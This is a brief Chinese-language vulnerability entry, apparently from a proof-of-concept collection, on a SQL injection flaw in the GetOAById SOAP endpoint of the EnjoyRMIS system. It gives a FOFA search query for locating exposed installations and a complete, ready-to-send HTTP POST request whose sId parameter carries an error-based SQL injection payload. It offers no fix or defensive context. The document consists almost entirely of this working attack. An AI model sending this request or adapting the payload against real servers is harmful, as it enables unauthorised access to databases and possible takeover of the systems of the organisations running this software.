## EnjoyRMIS-GetOAById存在SQL注入漏洞

  EnjoyRMIS GetOAById存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

## fofa

```
body="CheckSilverlightInstalled"
```

## poc

```yaml
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOAById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOAById xmlns="http://tempuri.org/">
      <sId>string' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>
    </GetOAById>
  </soap:Body>
</soap:Envelope>
```

![image-20240707203405896](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407072034047.png)